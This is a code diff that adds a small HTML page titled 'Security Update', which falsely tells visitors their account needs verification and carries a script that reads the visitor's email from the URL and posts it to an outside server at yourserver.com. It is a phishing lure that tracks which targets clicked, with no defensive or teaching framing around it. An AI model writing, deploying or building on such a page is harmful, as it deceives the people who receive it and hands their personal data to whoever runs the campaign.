@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update</title>
+</head>
+<body>
+    <h2>Security Alert</h2>
+    <p>Your account requires verification. Please log in to continue.</p>
+</body>
+<script>
+    // Get email from URL and send it to the backend
+    const urlParams = new URLSearchParams(window.location.search);
+    const userEmail = urlParams.get('email');
+    
+    if (userEmail) {
+        fetch('https://yourserver.com/log', { 
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userEmail })
+        });
+    }
+</script>
+</html>
